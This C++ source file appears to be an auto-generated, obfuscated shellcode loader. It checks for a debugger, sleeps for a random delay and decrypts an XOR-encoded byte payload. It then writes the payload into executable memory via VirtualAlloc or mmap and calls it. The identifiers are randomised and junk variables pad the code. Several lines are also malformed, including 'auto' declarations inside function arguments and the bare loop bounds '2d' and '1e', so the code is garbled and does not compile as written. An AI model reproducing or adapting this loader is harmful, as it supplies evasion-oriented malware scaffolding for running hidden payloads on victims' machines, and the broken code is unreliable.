/* Unique ID: 359633550770623523 */
#include <iostream>
#include <vector>
#include <string>
#include <cstring>
#include <cstdint>
#include <algorithm>
#include <chrono>
#include <thread>
#include <random>
#ifdef _WIN32
#include <windows.h>
#else
#include <sys/mman.h>
#include <unistd.h>
#endif

bool H8McxokrTKCWEquH() {
#ifdef _WIN32
    if (IsDebuggerPresent()) {
        OutputDebugStringA(auto h1_2Ox9pyAYSt = []() -> std::string {
    unsigned char p0JNaYNqMY4[] = {0x80, 0xc6, 0xd7, 0x48, 0xa9, 0xd7, 0xe2, 0xb2, 0xd0, 0x23, 0xc4, 0x71, 0x8, 0x2f, 0x68, 0xc3, 0x2f, 0x88, 0x8a};
    unsigned char zfJiY10m[] = {0xde, 0x66, 0x56, 0x40, 0x6b, 0x90, 0x2, 0x39, 0xb5, 0x2b, 0x7, 0x13, 0x4d, 0x57, 0x66, 0xb2, 0x42, 0x4e, 0xe5, 0x3c, 0x1, 0xaa, 0x3d, 0x5b, 0xac, 0x7d, 0x84, 0xfe, 0xce, 0xa0, 0xde, 0xc4, 0x58, 0x9, 0x47, 0x79, 0x4b, 0x70, 0x9, 0x62, 0x9d, 0x78, 0x4, 0xbe, 0x18};
    std::string result;
    for (size_t i = 0; i < 2d; i++) {
        unsigned char c = zfJiY10m[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= p0JNaYNqMY4[i % 13];
        result += c;
    }
    return result;
}().c_str());
        OutputDebugStringA(auto OxNdtdvpJu = []() -> std::string {
    unsigned char OULYTWK4GjIL4[] = {0x83, 0xe2, 0xf, 0xd9, 0x98, 0xbf, 0xed, 0x54, 0x42, 0x1c, 0xd2, 0x41, 0xce, 0xda, 0xef, 0x4, 0x51, 0xcd, 0x9d, 0x8e, 0x58, 0x23, 0x37, 0x80, 0xb7, 0xd6, 0x83, 0xfb, 0x8b, 0xaf, 0xed, 0x40};
    unsigned char ke2jFQz4sJJ[] = {0xc6, 0x47, 0x90, 0xcc, 0xe2, 0xd3, 0x72, 0x36, 0xd1, 0x6a, 0x3f, 0x4a, 0x1, 0xa8, 0x70, 0x74, 0xb1, 0xb4, 0x2f, 0x66, 0xcc, 0x4f, 0x84, 0x8, 0xfe, 0xae, 0x6d, 0xef, 0x2b, 0x1b, 0xe2, 0xd6, 0x3d, 0x3d, 0xf9, 0xec, 0x9b, 0xeb, 0x7a, 0x1e, 0x11, 0x6a, 0xbd, 0xa0, 0x99, 0x72, 0xd0, 0x8e, 0x3b};
    std::string result;
    for (size_t i = 0; i < 31; i++) {
        unsigned char c = ke2jFQz4sJJ[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= OULYTWK4GjIL4[i % 20];
        result += c;
    }
    return result;
}().c_str());
        __asm { nop; nop; nop; } // Convenient breakpoint
    }
#endif
    return true;
}

std::vector<uint8_t> HuzLDdl0BiVOUB(const std::vector<uint8_t>& data, const std::vector<uint8_t>& key) {
    std::vector<uint8_t> result = data;
    for (size_t i = 0; i < result.size(); i++) {
        result[i] ^= key[i % key.size()];
        result[i] = (result[i] >> 3) | (result[i] << 5);
        result[i] ^= i & 0xFF;
    }
    return result;
}

int main() {
    H8McxokrTKCWEquH();

    {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dist(1, 988);
        std::this_thread::sleep_for(std::chrono::milliseconds(dist(gen)));
    }

    volatile int TczW9sWBW = 687;
    volatile int Big9s7vs4K = 950;
    volatile int wScjdLq67Ye = 694;
    volatile int tdiLOA56F = 516;
    volatile int pNXcdVR11b6uI = 359;
    {
        auto pHcB1w3ttY = []() { return 84; };
        volatile int xawesl1qS = pHcB1w3ttY();
    }
    volatile int mwj0yOryI2 = 642;
    volatile int uJcA2rnty9NqVTP = 118;
    volatile int JR7PgW6PAMk = 526;
    {
        auto exBT9GuQ1 = []() { return 29; };
        volatile int eKAsaJ8a = exBT9GuQ1();
    }
    std::vector<uint8_t> giur9TrkZLpJG1DS = {
        0x27, 0xf5, 0xf9, 0x39, 0x71, 0xd1, 0xcc, 0xc7, 0x72, 0xad, 0xf5, 0xe4, 0x8b, 0x35, 0x8f, 0x5a, 
        0x58, 0x81, 0x6a, 0x21, 0x17, 0x4c, 0x9e, 0x76, 0xfe, 0x06, 0x68, 0xb5, 0x2c, 0x98, 0x80, 0x7b, 
        0xa4, 0xbd, 0xe1, 0x99, 0xc3, 0x71, 0xf4, 0x45, 0x12, 0xf7, 0x05, 0xee, 0x93, 0x9d, 0x35, 0xb2, 
        0x79, 0x40, 0x6b, 0x20
    };

    std::vector<uint8_t> qP4ZHgNYHqlT = {
        0xb0, 0xf6, 0x16, 0x34, 0x8e, 0xf3, 0x2a, 0x38, 0x2e, 0xb4, 0x8b, 0x98, 0x83, 0x73, 0x10, 0xc7, 
        0x40, 0x40, 0x4c, 0x68, 0x05, 0x53, 0x74, 0x0c, 0xba, 0x8a, 0x22, 0xb0, 0x26, 0xd6, 0xbc, 0xfe
    };

    volatile int QBah4grxbdb7Boe = 871;
    volatile int UNPorDVSdV = 405;
    {
        std::string ZEP8ueEuBT = auto Zg0eQZID8UVBW = []() -> std::string {
    unsigned char wXJChUUufiA9[] = {0xa6, 0x77, 0x93, 0x3, 0x16, 0x28, 0x1b, 0xcd, 0x82, 0x9f, 0xb2, 0xe7, 0x87, 0x7e, 0x15, 0xb0, 0x2a, 0xba, 0x1d, 0x4d, 0x2, 0xe7, 0x4a};
    unsigned char IRM3ZTox[] = {0x46, 0x19, 0x25, 0xb8, 0xfe, 0x4e, 0x44, 0x52, 0xdd, 0x7f, 0x26, 0x46, 0x63, 0x4, 0xbd, 0x98, 0x53, 0x4d, 0xd0, 0x12};
    std::string result;
    for (size_t i = 0; i < 14; i++) {
        unsigned char c = IRM3ZTox[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= wXJChUUufiA9[i % 17];
        result += c;
    }
    return result;
}();
        ZEP8ueEuBT += auto HVHNj6sO9OxNmg6D = []() -> std::string {
    unsigned char ILDGf5F6mR1[] = {0x63, 0xa5, 0xd3, 0x36, 0xa, 0xac, 0x88, 0xe7, 0xbf, 0xf, 0x20, 0xd6, 0x6, 0x8c, 0x61, 0x2b, 0xd4, 0x79, 0xac, 0x99, 0xe6, 0xdc, 0x42, 0xca, 0x97, 0x69, 0xe1, 0x5a, 0xf0, 0xa0};
    unsigned char QbUnbAaPL[] = {0x30, 0x17, 0x1f, 0x8, 0x1f};
    std::string result;
    for (size_t i = 0; i < 5; i++) {
        unsigned char c = QbUnbAaPL[i];
        c ^= i;
        c = (c >> 3) | (c << 5);
        c ^= ILDGf5F6mR1[i % 1e];
        result += c;
    }
    return result;
}();
    }
    volatile int ME5qA01RU = 721;
    {
        volatile int xbcaYrUe6 = 295;
        xbcaYrUe6 += 61;
        xbcaYrUe6 *= 4;
    }
    std::vector<uint8_t> RKKbI7vdk0TVOzu = HuzLDdl0BiVOUB(giur9TrkZLpJG1DS, qP4ZHgNYHqlT);

#ifdef _WIN32
    LPVOID MmywaQMF3u_ = VirtualAlloc(NULL, RKKbI7vdk0TVOzu.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (MmywaQMF3u_) {
        memcpy(MmywaQMF3u_, RKKbI7vdk0TVOzu.data(), RKKbI7vdk0TVOzu.size());
        ((void(*)())MmywaQMF3u_)();
    }
#else
    void* MmywaQMF3u_ = mmap(NULL, RKKbI7vdk0TVOzu.size(), PROT_EXEC | PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (MmywaQMF3u_ != MAP_FAILED) {
        memcpy(MmywaQMF3u_, RKKbI7vdk0TVOzu.data(), RKKbI7vdk0TVOzu.size());
        ((void(*)())MmywaQMF3u_)();
    }
#endif
    return 0;
}
